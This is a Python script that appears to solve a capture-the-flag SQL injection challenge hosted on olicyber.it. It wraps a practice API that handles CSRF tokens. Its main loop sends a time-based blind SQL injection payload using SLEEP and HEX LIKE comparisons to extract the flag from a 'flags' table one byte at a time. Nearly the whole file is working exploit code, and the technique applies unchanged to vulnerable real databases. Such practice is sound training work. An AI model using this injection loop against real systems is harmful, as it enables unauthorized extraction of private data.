import requests
from time import time
# TEMPLATE

class Inj:
    def __init__(self, host):

        self.sess = requests.Session() # Start the session. We want to save the cookies
        self.base_url = '{}/api/'.format(host)
        self._refresh_csrf_token() # Refresh the ANTI-CSRF token

    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + 'get_token')
        resp = resp.json()
        self.token = resp['token']

    def _do_raw_req(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query }
        return self.sess.post(url,json=data, headers=headers).json()

    def logic(self, query):
        url = self.base_url + 'logic'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def union(self, query):
        url = self.base_url + 'union'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def blind(self, query):
        url = self.base_url + 'blind'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def time(self, query):
        url = self.base_url + 'time'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']
    
payload = Inj('http://web-17.challs.olicyber.it') # ottengo il link
data, done = "", False
while not done:
    for i in range(256):
        start = time()
        res, err = payload.time(f"1' AND (SELECT SLEEP(1) FROM flags WHERE HEX(flag) LIKE '{data}{bytes([i]).hex()}%')='1")
        elapsed = time() - start
        if elapsed > 0.75: # bound
            data += bytes([i]).hex()
            print(data)
            break
        if i == 255:
            done = True
            break
            
print(bytes.fromhex(data).decode())